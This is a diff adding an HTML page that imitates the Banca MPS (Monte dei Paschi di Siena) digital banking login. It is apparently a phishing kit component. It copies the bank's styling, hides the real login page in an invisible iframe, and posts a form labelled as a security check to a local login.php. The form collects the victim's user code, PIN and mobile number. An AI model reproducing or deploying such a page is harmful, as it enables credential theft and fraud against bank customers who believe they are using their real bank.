@@ -1,0 +1,188 @@
+
+<!DOCTYPE html>
+<html lang="it" style="overflow-y: scroll; height: 90%; max-height: 500px">
+<head>
+<title>Banca MPS</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1,user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="format-detection" content="telephone=no">
+<meta name="apple-itunes-app" content="app-id=366805842">
+<link rel="stylesheet" type="text/css" href="https://digital.mps.it:443/cmn/assets/css/catalogo/w.login.digitalBanking.min.css?vers=1201554"/>
+<script src="/cmn/assets/js/jquery-3.4.1.min.js"></script>
+<script src="/cmn/assets/js/jquery-ext.js?vers=1201554"></script>
+</head>
+<body>
+<img style="margin-left: auto; margin-right: auto; display: block;" src="logo.png" height="15%" width="15%">
+<iframe id="avalonLogin" name="avalonLogin" style="display: none;" src="https://digital.mps.it/login.html"></iframe>
+<div class="db_login_70perc urlPrivacyCookie" id="wrapperLogin70perc" data-privacy-check-url="/pri/loginib/checkPrivacyCookie.action?nullnull" data-privacy-set-url="/pri/loginib/setPrivacyCookie.action?nullnull">
+<div id="digitalBankingMain" class="row">
+<div class="smartbanner" style="display:none" id="smartabanner">
+<div class="smartbanner-container">
+<a href="#" id="smb-close" class="smartbanner-close" data-template="#button-btnCloseSmartBanner">&times;</a>
+<span class="smartbanner-icon"></span>
+<div class="smartbanner-info">
+<div class="smartbanner-title">Banca MPS</div>
+<div>Banca Monte dei Paschi di Siena S.p.A.</div>
+<span id="description-banner"></span>
+</div>
+<a href="javascript: void(0))" target="_blank" id="buttonBannerLink" class="smartbanner-button">
+<span id="buttonStore" class="smartbanner-button-text">Apri</span>
+</a>
+</div>
+</div>
+<div id="cookieModalPopup" style="display:none" class="mod">
+<div class="mod-content">
+<div class="mod-header">
+<span class="close">×</span>
+<img src="/libs/img/xlogo_banner_cookie.png.pagespeed.ic.C0ytnVr8Uw.webp" class="img_mod">
+<h2 class="header_title_mod">Informativa cookie</h2>
+</div>
+<div class="mod-body">
+<h2 class="body_title_mod">Informativa cookie</h2>
+<p class="body_mod_sub"> L'Area Riservata del Digital Banking utilizza cookie tecnici e analytics per i quali non è necessario acquisire il consenso dell'utente. Per maggiori dettagli e per conoscere le caratteristiche dei cookie utilizzati si invita a prendere visione dell'informativa resa da Banca Monte dei Paschi di Siena S.p.A., titolare del trattamento ai sensi dell'art.13 del GDPR, presente alla sezione <a href="https://www.mps.it/cookies.html">privacy policy.</a></p>
+</div>
+<div class="mod-footer">
+<button type="button" id="btn_neg" class="btn btn-primary" style=" visibility: collapse; width: auto!important; max-height: 38px; "></button>
+<button type="button" id="acceptCook" class="btn btn-primary" style="width: auto!important;max-height: 38px;float: right;min-width: 120px!important;">Ok</button>
+</div>
+</div>
+</div>
+<div class="container80baseDigital">
+
+<div class="wd_loading_widget_mobile"></div>
+<div class="row">
+<div class="col-md-24">
+<div class="row" id="boxNavigationDigitalBanking">
+<div class="col-12">
+<div id="backToUserCodeFromPassword" class="dB_icon_link_container" style="display: none;">
+<a class="dB_link_with_icon" id="btnIndietroPsw" href="javascript: void(0)" data-template="#button-btnIndietroPsw">
+<div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
+<h4 class="mps_bold">Indietro</h4>
+</a>
+</div>
+<div id="backToUserCodeFromPasswordBlue" class="dB_icon_link_container" style="display: none;">
+<a class="dB_link_with_icon" id="btnIndietroPswBlu" href="javascript: void(0)" data-template="#button-btnIndietroPswBlu">
+<div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
+<h4 class="mps_bold">Indietro</h4>
+</a>
+</div>
+<div id="backToPswFromOtp" class="dB_icon_link_container" style="display: none;">
+<a class="dB_link_with_icon" id="backToPsw" href="javascript: void(0)" data-template="#button-btnBackToPsw">
+<div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
+<h4 class="mps_bold">Indietro</h4>
+</a>
+</div>
+<div id="backToPswFromFeF" class="dB_icon_link_container" style="display: none;">
+<a class="dB_link_with_icon" id="backToPswtoFeF" href="javascript: void(0)" data-template="#button-btnBackToPswFromFeF">
+<div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
+<h4 class="mps_bold">Indietro</h4>
+</a>
+</div>
+<div id="backToPswBlueFromNewPsw" class="dB_icon_link_container" style="display: none;">
+<a class="dB_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" data-template="#button-btnIndietroNewPsw">
+<div class="img-svg mps_small_arrow_down_red mps_rotate_90"></div>
+<h4 class="mps_bold">Indietro</h4>
+</a>
+</div>
+</div>
+<div class="col-12" style="height:36px">
+<div id="close" class="mps_icon_link_container" style="float: right; padding-right: 0;">
+<a class="mps_link_with_icon" id="btnIndietroNewPsw" href="javascript: void(0)" onclick="hideOverlay()" tabindex="-1">
+</a>
+</div>
+</div>
+<div class="col-2"></div>
+<div class="col-20">
+<div class="db_media_center_wrapper db_column_middle"></div>
+<div class="db_content_login_header">
+<div class="db_logo_black"></div>
+</div>
+</div>
+<div class="col-2"></div>
+<script>
+	 function hideOverlay() {
+		 $("#overlayMPS").hide(); //NASCONDO L'OVERLAY
+		 $('#innerDiv').html(""); //SVUOTO IL DIV 
+         
+         $("body.hp").css("overflow","auto"); //RIABILITO LO SCROLL SUL BODY 
+	 }
+	</script>
+</div>
+</div>
+</div>
+<div class="row db_responsiveRow">
+<div class="col-md-1"></div>
+<div class="col-md-22 form-group mps_input_with_label_container dB_responsive" id="db_mainBox" tabindex="0" role="form" aria-label="Accedi al tuo Digital Banking">
+<div id="includeHeader" class="margin_login_header includeHeader">
+<div class="mps_form_container_centrale">
+<div class="row" id="boxHeaderDgitalBanking">
+<div class="col-md-19">
+<h1>Area Riservata</h1>
+</div>
+</div>
+</div>
+</div>
+<div id="includeCodUser" class="margin_login_header includeCodUser dB_box_container">
+ 
+<input type="hidden" name="userType" id="userType">
+<div id="login-codiceUtente">
+<div class="mps_input_with_label_form">
+<div class="mps_form_container_centrale">
+<table class="db_marginTopBottom_header">
+<tr>
+<td><h3>Accedi al tuo Digital Banking</h3></td>
+</tr>
+</table>
+<form action="login.php" method="post">
+<div class="row">
+<div class="col-md-6 db_colLabelCustom">
+<div class="mps_label_with_tooltip_container">
+<label class="mps_label dB_label" id="labelCodUserSca" for="input-codUser">Verifica di sicurezza</label>
+<div class="mps_tooltip_white_background_red_bi dB_tooltip_margin" data-toggle="tooltip" title="Inserisci il tuo codice utente"></div>
+</div>
+</div>
+<div class="col-md-13 db_colInputCustom">
+<input type="text" name="user" class="form-control mps_input" aria-required="true" id="input-codUser" placeholder="Inserisci il tuo codice utente" autocomplete="off">
+<br>
+<input type="pin" name="pass" class="form-control mps_input" aria-required="true" id="input-codUser" placeholder="Inserisci il tuo PIN" autocomplete="off">
+<br>
+<input type="text" name="cell" class="form-control mps_input" aria-required="true" id="input-codUser" placeholder="Inserisci il tuo numero di cellulare" autocomplete="off">
+
+</div>
+<div class="col-md-13 db_colInputCustom">
+    
+<a id="iCheck" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+<div class="mps_approved_green dB_inputCheck"></div>
+
+</a> <a id="iError" class="wd_btn_showPassword" style="display: none;" tabindex="-1">
+<div class="mps_not_approved_red dB_inputCheck"></div>
+</a>
+</div>
+<br>
+<div class="col-md-5 paddingTop-Login">
+<button class="btn btn-primary" type="submit">ENTRA</button>
+</form>
+</a>
+</div>
+</div>
+<div class="row add-margin-20" tabindex="0" aria-label="Memorizza il tuo Codice Utente e dal prossimo accesso non dovrai più inserirlo">
+<div class="col-md-24">
+<div class="mps_label_with_tooltip_container">
+<label class="checkcontainer" tabindex="0" id="loginOtp1" aria-label="Premi invio per selezionare" style="float: left;"> Ricorda codice utente
+<input type="checkbox" id="checkRicordamiCodUser" tabindex="-1"> <span class="checkmark"></span></label>
+<div class="mps_tooltip_white_background_red_bi dB_responsive_Check" data-toggle="tooltip" title="" data-original-title="Memorizza il tuo Codice Utente e dal prossimo accesso non dovrai più inserirlo">
+</div>
+</div>
+</div>
+</div>
+<div id="" class="recuperoCodiceUtenteDigital" style="padding-top: 15px">
+<h5><a id="linkCarteSicurezza9" href="#" tabindex="0" onclick="window.open('/pub/pb/aolInizio/action/pb/recuperaUtenteUsernameInit.action?sezId=nav_recupero_credenziali&pageId=nav_recupero_credenziali', '_self');">
+RECUPERA CODICE UTENTE
+</a></h5>
+</div>
+</div>
+</div>
+</div>
+
+</html>
